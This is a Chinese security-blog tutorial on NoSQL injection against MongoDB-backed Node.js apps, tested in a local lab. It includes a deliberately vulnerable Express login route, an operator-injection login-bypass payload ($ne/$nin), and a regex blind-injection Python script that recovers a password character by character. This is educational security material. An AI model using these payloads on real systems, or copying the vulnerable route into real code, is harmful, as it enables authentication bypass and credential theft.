---
title: Nosql inject注入的一点研究
url: https://mp.weixin.qq.com/s?__biz=MzkwMTE4NDM5NA==&mid=2247486205&idx=2&sn=380ce6e678751d6a0e7ffb6b6949246d&chksm=c0b9e418f7ce6d0ecb2013407e04eb71dbc5e3d43ec892538aaab8f6afa098ae31f91def9f9e&scene=58&subscene=0#rd
source: 无害实验室sec
date: 2023-01-05
fetch_date: 2025-10-04T03:04:45.230881
---

# Nosql inject注入的一点研究

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/ewSxvszRhM4VOAfpT2qdJiar5XaHeUuhY0m9IM8VKOWTiaBNanicFCmZQx4FRWK0hRt4No5ohkNQMrHrsWwKq9icGQ/0?wx_fmt=jpeg)

# Nosql inject注入的一点研究

渗透测试网络安全

**声明：**该公众号大部分文章来自作者日常学习笔记，也有少部分文章是经过原作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。

## 0x01 What is nosql？

    NoSQL 即 Not Only SQL，意即 “不仅仅是SQL”。NoSQL 是一项全新的数据库革命性运动，早期就有人提出，发展至 2009 年趋势越发高涨。NoSQL的拥护者们提倡运用非关系型的数据存储，相对于铺天盖地的关系型数据库运用，这一概念无疑是一种全新的思维的注入。

![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM4VOAfpT2qdJiar5XaHeUuhY7Mb5esNQYqPHOHsCjbGZssxicJ12WYhfAOgEjZGLskA5b6owjoKPmqg/640?wx_fmt=png)

## 0x02 Nosql 注入的简介

NoSQL 注入由于 NoSQL 本身的特性和传统的 SQL 注入有所区别。

使用传统的SQL注入，攻击者利用不安全的用户输入来修改或替换应用程序发送到数据库引擎的 SQL 查询语句（或其他SQL语句）。
换句话说，SQL 注入使攻击者可以在数据库中 SQL 执行命令。

与关系数据库不同:

NoSQL 数据库不使用通用查询语言。NoSQL 查询语法是特定于产品的，查询是使用应用程序的编程语言编写的：PHP，JavaScript，Python，Java 等。这意味着成功的注入使攻击者不仅可以在数据库中执行命令，而且可以在应用程序本身中执行命令，这可能更加危险。

## 0x03 最常见的MongoDB

MongoDB 是当前最流行的 NoSQL 数据库产品之一，由 C++ 语言编写，是一个基于分布式文件存储的数据库。旨在为 WEB 应用提供可扩展的高性能数据存储解决方案。

## 单词对标

在 MongoDB 中基本的概念有一些特殊的名字“文档、集合、数据库”

这个是先知文章之中看到的，感觉对比的非常好，一目了然，对于快速掌握还是比较友好

表所示：

| SQL 概念 | MongoDB 概念 | 说明 |
| --- | --- | --- |
| database | database | 数据库 |
| table | collection | 数据库表/集合 |
| row | document | 数据记录行/文档 |
| column | field | 数据字段/域 |
| index | index | 索引 |
| table joins |  | 表连接，MongoDB 不支持 |
| primary key | primary key | 主键，MongoDB 自动将 `_id` 字段设置为主键 |

下表列出了关系型数据库 RDBMS 与 MongoDB 之间对应的术语：

| RDBMS | MongoDB |
| --- | --- |
| 数据库 | 数据库 |
| 表格 | 集合 |
| 行 | 文档 |
| 列 | 字段 |
| 表联合 | 嵌入文档 |
| 主键 | 主键（MongoDB 提供了 key 为 \_id） |

# 0x04 mongodb的简单使用

首先我们先熟悉一下mongodb的常规用法，回归基础哈哈

下面是我学习的一些command line

### 利用账号密码登陆

```
# mongo mongodb://admin:admin@127.0.0.1:27017                                          MongoDB shell version v4.0.27connecting to: mongodb://127.0.0.1:27017/?gssapiServiceName=mongodbImplicit session: session { "id" : UUID("e1c9a87d-f9e4-4cfc-b661-8d7019d19628") }MongoDB server version: 4.0.27Server has startup warnings: 2022-11-26T02:29:47.282+0000 I STORAGE  [initandlisten] 2022-11-26T02:29:47.282+0000 I STORAGE  [initandlisten] ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine2022-11-26T02:29:47.282+0000 I STORAGE  [initandlisten] **          See http://dochub.mongodb.org/core/prodnotes-filesystem---Enable MongoDB's free cloud-based monitoring service, which will then receive and displaymetrics about your deployment (disk utilization, CPU, operation statistics, etc).
The monitoring data will be available on a MongoDB website with a unique URL accessible to youand anyone you share the URL with. MongoDB may use this information to make productimprovements and to suggest MongoDB products and deployment options to you.
To enable free monitoring, run the following command: db.enableFreeMonitoring()To permanently disable this reminder, run the following command: db.disableFreeMonitoring()---
```

### 查看数据库

```
> show dbsadmin   0.000GBarl     0.041GBconfig  0.000GBlocal   0.000GB
```

### 当前数据库

```
> dbtest
```

### 切换数据库

```
> use arlswitched to db arl
```

### 查看集合(相当于看库表)

```
> show collectionsasset_domainasset_ipasset_sitecert...> show tablesasset_domainasset_ipasset_sitecert...
```

### 创建一个集合

```
> db.createCollection("zeotest"){ "ok" : 1 }> show tablesall_usersasset_domainasset_ipasset_sitecertzeotest
```

### 插入一个文档（数据）

```
db.zeotest.insert({name: 'zeo',     description: 'the hacker',    age: 18,    status: 'UP',    tel: ['13888888888', '66666666666']})
```

### 查询数据，带条件的查询

在 MongoDB 中使用 `find()` 方法来查询文档

```
> db.zeotest.find(){ "_id" : ObjectId("63817c440c8866311e74ab59"), "name" : "zeo", "description" : "the hacker", "age" : 18, "status" : "UP", "tel" : [ "13888888888", "66666666666" ] }> db.zeotest.insert({name: 'jebson',     description: 'the it',     age: 22,     status: 'down',     tel: ['138888', '666666'] })WriteResult({ "nInserted" : 1 })> db.zeotest.find(){ "_id" : ObjectId("63817c440c8866311e74ab59"), "name" : "zeo", "description" : "the hacker", "age" : 18, "status" : "UP", "tel" : [ "13888888888", "66666666666" ] }{ "_id" : ObjectId("63817cb30c8866311e74ab5a"), "name" : "jebson", "description" : "the it", "age" : 22, "status" : "down", "tel" : [ "138888", "666666" ] }> db.zeotest.find({"name":"zeo"}){ "_id" : ObjectId("63817c440c8866311e74ab59"), "name" : "zeo", "description" : "the hacker", "age" : 18, "status" : "UP", "tel" : [ "13888888888", "66666666666" ] }>
```

## 靶场搭建

有一个小bug，现在版本升级之后，得用下面这个，mongodb的包是包含在这个里面的

```
npm install mongoose
```

# 0x05 NoSQL 注入

##

## 0x06 重言式注入

也叫永真式，此类攻击是在条件语句中注入代码

使生成的表达式判定结果永远为真，类似万能密码

看一下下面这个简单的js代码

```
app.get('/inject', function(req, res) {  var user = (req.query.user);  var pass = (req.query.pass);  var query = ( '{ "name": '+user+', "passwd": '+pass+' }' );  console.log(query)  const mydb = db.db('arl')  console.log(user,"---",pass)  mydb.collection(mongo_col).findOne({    "name": user,     "passwd": pass  }, function (err, user) {    if (err) {      return res.status(500).send({message: err.message});    }    else if (!user) {      res.render('error', {error: 'Sorry user not found!' });    }    else{        res.render('result', {user: user.user, pass: user.pass });    }  });});
```

payload

```
http://127.0.0.1:8000/inject?user[$nin][]=&pass[$ne]=
```

实际获取的数据

user 是 `{ '$nin': [ '' ] }`
pass 是 `{ '$ne': '' }`

拼接之后的qurey是

```
{ "name": [object Object], "passwd": [object Object] }
```

解释一下：

* 首先是`$ne` 是 not equal 不等于
* http链接中`user[$nin][]=&pass[$ne]=`
* js中是 `query =array( "user" => array("$nin" => 1),"pass" => ("$ne" => 1))`
* mongodb中拼接查询就是

```
mydb.collection(mongo_col).find({ "name": {"$nin":1}, "passwd": {"$ne":1} })
```

* 这样就相当于是万能密码那 or 1=1 吧， 查询就是永真的情况

## 0x07 盲注

现在感觉很多的地方都是当页面没有回显这种情况

一般都通过通过 `$regex` 正则表达式操作

而且 NoSQL 用到的基本上都是布尔盲注。

payload

```
GET /inject?login=&user[$eq]=zeo2&pass[$regex]=.{7} HTTP/1.1Host: 127.0.0.1:8000
错误，说明长度没有7GET /inject?login=&user[$eq]=zeo2&pass[$regex]=.{6} HTTP/1.1Host: 127.0.0.1:8000
正确，说明长度为6
```

写给脚步跑一下

```
import requestsimport urllib3import stringimport urlliburllib3.disable_warnings()passwd = ''target = 'http://127.0.0.1:8000/inject?login=&user[$eq]=zeo2&pass[$regex]='while True:    for word in string.printable:        if word not in ['*', '+', '.', '?', '|', '#', '&', '$']:            payload = '^%s' % (passwd + word)            r = requests.get(target + payload)            if 'Welcome' in r.text:                print("Found one more char : %s" % (passwd+word))                passwd += word
```

![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM4VOAfpT2qdJiar5XaHeUuhYicCFB03HeuwILibpwSib9Bzm4EDYW8Kf7hpSpy7icK1YZpCABZ9lh5AO3Q/640?wx_fmt=png)

文章作者: Zeo

文章链接: https://godzeo.github.io/2022/11/28/Nosql%20inject%E6%B3%A8%E5%85%A5/

**关 注 有 礼**

关注本公众号回复“718619”

可以免费领取全套网络安全学习教程，安全靶场、面试指南、安全沙龙PPT、代码安全、火眼安全系统等

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1) 还在等什么？赶紧点击下方名片关注学习吧

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM6HBIesNL5xC8L1fzZ9B5tdY9lzUeJ68B338TibfaRdEbVHq1BBjQSJyV2MpvX3dgxM3HhgfAMm9Qw/0?wx_fmt=png)

渗透测试网络安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM6HBIesNL5xC8L1fzZ9B5tdY9lzUeJ68B338TibfaRdEbVHq1BBjQSJyV2MpvX3dgxM3HhgfAMm9Qw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过